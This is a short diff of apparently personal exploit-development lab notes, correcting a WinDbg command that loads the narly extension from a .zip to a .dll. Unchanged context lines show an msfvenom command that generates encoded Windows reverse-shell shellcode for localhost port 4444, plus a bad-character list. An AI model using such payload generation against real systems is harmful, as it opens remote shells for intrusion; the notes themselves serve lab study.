@@ -3,4 +3,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -e x86/shi
 -b "\x00\x0a\x0d\x25\x26\x2b\x3d" bad characters
 
 To install narly, download narly.zip extract it, put dll in some folder and then load from windbg
-.load C:\Tools\narly.zip
+.load C:\Tools\narly.dll
